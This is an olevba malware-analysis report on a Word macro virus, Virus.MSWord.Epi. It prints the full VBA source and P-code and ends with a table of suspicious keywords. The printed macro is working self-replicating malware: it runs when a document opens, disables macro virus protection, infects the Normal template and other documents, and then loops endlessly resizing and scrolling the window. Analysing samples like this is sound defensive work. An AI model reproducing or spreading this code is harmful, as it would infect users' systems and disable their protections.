olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Epi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Epi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()

On Error Resume Next

Options.VirusProtection = False

EpilepticFit

End Sub

Private Sub EpilepticFit()
    If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
        For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
            lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
         Next I
        ' Save it
        If (Not ActiveDocument.ReadOnly) Then
            ActiveDocument.SaveAs AddToRecentFiles:=False
        End If
        
            
    ElseIf Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
            For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
                lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
                NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
            Next I
            ' Save It
            NormalTemplate.Save
    Else
        'If the normal and active are infected now activate the payload
        Convulse
    End If
  
End Sub

Private Sub Convulse()
  
    Dim maxWidth As Long
    Dim maxHeight As Long
    maxWidth = ActiveWindow.Width
    maxHeight = ActiveWindow.Height
    
    maxHeight = maxHeight - 50
    maxWidth = maxWidth - 50
    If (ActiveWindow.WindowState <> wdWindowStateNormal) Then
            ActiveWindow.WindowState = wdWindowStateNormal
    End If
    ActiveWindow.Height = ActiveWindow.Height / 2
    ActiveWindow.Height = ActiveWindow.Height / 2
    Randomize
    While (True)
        
        
        
        If Int(2 * Rnd) = 1 Then
            If (ActiveWindow.Height > maxHeight) Then
               ActiveWindow.Height = ActiveWindow.Height - 50
            Else
                ActiveWindow.Height = ActiveWindow.Height + 50
            End If
            
            If (ActiveWindow.Width > maxWidth) Then
                ActiveWindow.Width = ActiveWindow.Width - 50
            Else
                ActiveWindow.Width = ActiveWindow.Width + 50
            End If
            
            If (ActiveWindow.VerticalPercentScrolled > 90) Then
                ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled - 10
            Else
                ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled + 10
            End If
        Else
         
            If (ActiveWindow.Height < 50) Then
                ActiveWindow.Height = ActiveWindow.Height - 50
            Else
                ActiveWindow.Height = ActiveWindow.Height + 50
            End If
           
            If (ActiveWindow.Width < 50) Then
                ActiveWindow.Width = ActiveWindow.Width - 50
            Else
                ActiveWindow.Width = ActiveWindow.Width + 50
            End If
               
            If (ActiveWindow.VerticalPercentScrolled < 10) Then
                ActiveWindow.VerticalPercentScrolled = ActiveWindowVerticalPercentScrolled + 10
            Else
                ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled - 10
            End If
        End If
        Start = Timer   ' Set start time.
        Do While Timer < Start + 0.2
            DoEvents    ' Yield to other processes.
        Loop
    Wend
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Epi
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 18290 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' Line #7:
' 	ArgsCall EpilepticFit 0x0000 
' Line #8:
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Private Sub EpilepticFit())
' Line #12:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #13:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #14:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lineofcode 
' Line #15:
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld lineofcode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #16:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	QuoteRem 0x0008 0x0008 " Save it"
' Line #18:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #19:
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #20:
' 	EndIfBlock 
' Line #21:
' Line #22:
' Line #23:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	ElseIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #25:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lineofcode 
' Line #26:
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld lineofcode 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #27:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	QuoteRem 0x000C 0x0008 " Save It"
' Line #29:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	ElseBlock 
' Line #31:
' 	QuoteRem 0x0008 0x003E "If the normal and active are infected now activate the payload"
' Line #32:
' 	ArgsCall Convulse 0x0000 
' Line #33:
' 	EndIfBlock 
' Line #34:
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Private Sub Convulse())
' Line #38:
' Line #39:
' 	Dim 
' 	VarDefn maxWidth (As Long)
' Line #40:
' 	Dim 
' 	VarDefn maxHeight (As Long)
' Line #41:
' 	Ld ActiveWindow 
' 	MemLd With 
' 	St maxWidth 
' Line #42:
' 	Ld ActiveWindow 
' 	MemLd Height 
' 	St maxHeight 
' Line #43:
' Line #44:
' 	Ld maxHeight 
' 	LitDI2 0x0032 
' 	Sub 
' 	St maxHeight 
' Line #45:
' 	Ld maxWidth 
' 	LitDI2 0x0032 
' 	Sub 
' 	St maxWidth 
' Line #46:
' 	Ld ActiveWindow 
' 	MemLd WindowState 
' 	Ld wdWindowStateNormal 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #47:
' 	Ld wdWindowStateNormal 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld ActiveWindow 
' 	MemLd Height 
' 	LitDI2 0x0002 
' 	Div 
' 	Ld ActiveWindow 
' 	MemSt Height 
' Line #50:
' 	Ld ActiveWindow 
' 	MemLd Height 
' 	LitDI2 0x0002 
' 	Div 
' 	Ld ActiveWindow 
' 	MemSt Height 
' Line #51:
' 	ArgsCall Read 0x0000 
' Line #52:
' 	LitVarSpecial (True)
' 	Paren 
' 	While 
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #57:
' 	Ld ActiveWindow 
' 	MemLd Height 
' 	Ld maxHeight 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #58:
' 	Ld ActiveWindow 
' 	MemLd Height 
' 	LitDI2 0x0032 
' 	Sub 
' 	Ld ActiveWindow 
' 	MemSt Height 
' Line #59:
' 	ElseBlock 
' Line #60:
' 	Ld ActiveWindow 
' 	MemLd Height 
' 	LitDI2 0x0032 
' 	Add 
' 	Ld ActiveWindow 
' 	MemSt Height 
' Line #61:
' 	EndIfBlock 
' Line #62:
' Line #63:
' 	Ld ActiveWindow 
' 	MemLd With 
' 	Ld maxWidth 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #64:
' 	Ld ActiveWindow 
' 	MemLd With 
' 	LitDI2 0x0032 
' 	Sub 
' 	Ld ActiveWindow 
' 	MemSt With 
' Line #65:
' 	ElseBlock 
' Line #66:
' 	Ld ActiveWindow 
' 	MemLd With 
' 	LitDI2 0x0032 
' 	Add 
' 	Ld ActiveWindow 
' 	MemSt With 
' Line #67:
' 	EndIfBlock 
' Line #68:
' Line #69:
' 	Ld ActiveWindow 
' 	MemLd VerticalPercentScrolled 
' 	LitDI2 0x005A 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #70:
' 	Ld ActiveWindow 
' 	MemLd VerticalPercentScrolled 
' 	LitDI2 0x000A 
' 	Sub 
' 	Ld ActiveWindow 
' 	MemSt VerticalPercentScrolled 
' Line #71:
' 	ElseBlock 
' Line #72:
' 	Ld ActiveWindow 
' 	MemLd VerticalPercentScrolled 
' 	LitDI2 0x000A 
' 	Add 
' 	Ld ActiveWindow 
' 	MemSt VerticalPercentScrolled 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	ElseBlock 
' Line #75:
' Line #76:
' 	Ld ActiveWindow 
' 	MemLd Height 
' 	LitDI2 0x0032 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #77:
' 	Ld ActiveWindow 
' 	MemLd Height 
' 	LitDI2 0x0032 
' 	Sub 
' 	Ld ActiveWindow 
' 	MemSt Height 
' Line #78:
' 	ElseBlock 
' Line #79:
' 	Ld ActiveWindow 
' 	MemLd Height 
' 	LitDI2 0x0032 
' 	Add 
' 	Ld ActiveWindow 
' 	MemSt Height 
' Line #80:
' 	EndIfBlock 
' Line #81:
' Line #82:
' 	Ld ActiveWindow 
' 	MemLd With 
' 	LitDI2 0x0032 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #83:
' 	Ld ActiveWindow 
' 	MemLd With 
' 	LitDI2 0x0032 
' 	Sub 
' 	Ld ActiveWindow 
' 	MemSt With 
' Line #84:
' 	ElseBlock 
' Line #85:
' 	Ld ActiveWindow 
' 	MemLd With 
' 	LitDI2 0x0032 
' 	Add 
' 	Ld ActiveWindow 
' 	MemSt With 
' Line #86:
' 	EndIfBlock 
' Line #87:
' Line #88:
' 	Ld ActiveWindow 
' 	MemLd VerticalPercentScrolled 
' 	LitDI2 0x000A 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #89:
' 	Ld ActiveWindowVerticalPercentScrolled 
' 	LitDI2 0x000A 
' 	Add 
' 	Ld ActiveWindow 
' 	MemSt VerticalPercentScrolled 
' Line #90:
' 	ElseBlock 
' Line #91:
' 	Ld ActiveWindow 
' 	MemLd VerticalPercentScrolled 
' 	LitDI2 0x000A 
' 	Sub 
' 	Ld ActiveWindow 
' 	MemSt VerticalPercentScrolled 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	Ld Timer 
' 	St Start 
' 	QuoteRem 0x0018 0x0010 " Set start time."
' Line #95:
' 	Ld Timer 
' 	Ld Start 
' 	LitR8 0x999A 0x9999 0x9999 0x3FC9 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #96:
' 	ArgsCall DoEvents 0x0000 
' 	QuoteRem 0x0018 0x001A " Yield to other processes."
' Line #97:
' 	Loop 
' Line #98:
' 	Wend 
' Line #99:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

